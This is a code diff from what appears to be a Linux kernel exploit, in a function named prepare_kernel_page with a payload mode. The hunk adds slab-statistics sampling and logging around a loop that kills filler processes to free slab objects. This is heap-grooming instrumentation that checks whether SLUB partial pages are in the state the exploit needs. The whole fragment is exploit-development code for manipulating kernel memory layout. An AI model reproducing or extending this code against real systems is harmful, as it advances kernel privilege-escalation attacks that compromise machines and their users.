@@ -3337,9 +3337,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         /* base's page: pushed first, so it is the OLDEST entry on c->partial
          * and the drain below walks it last - after every page ahead of it has
          * raised n->nr_partial. */
-        for (size_t i = 0; i < freeze_kill; i++) {
-          kill_child(pre_ctx.childs[i]);
-          pre_ctx.childs[i] = -1;
+        {
+          long fa0 = -1, fn0 = -1, fs0 = -1;
+          long fa1 = -1, fn1 = -1, fs1 = -1;
+          if (post_f != NULL) {
+            rewind(post_f);
+            (void)mm_slab_scan(post_f, &fa0, &fn0, &fs0);
+          }
+          for (size_t i = 0; i < freeze_kill; i++) {
+            kill_child(pre_ctx.childs[i]);
+            pre_ctx.childs[i] = -1;
+          }
+          /* Sampled before the control's fillers are freed: this window
+           * contains the anchor's 31 frees and nothing else. */
+          if (post_f != NULL) {
+            rewind(post_f);
+            (void)mm_slab_scan(post_f, &fa1, &fn1, &fs1);
+            pr_info("KS_FILL_DELTA fillers=%zu active=%ld->%ld d_active=%ld "
+                    "d_num=%ld d_slabs=%ld page_was_full=%d\n",
+                    freeze_kill, fa0, fa1, fa1 - fa0, fn1 - fn0, fs1 - fs0,
+                    (fa1 == fa0 && fn1 == fn0 && fs1 == fs0) ? 1 : 0);
+          }
         }
         pr_info("KS_FREEZE fillers=%zu target_pid=%d cpu=%d empty_cpu=%d\n",
                 freeze_kill, (int)target, sched_getcpu(), burst_empty_cpu);
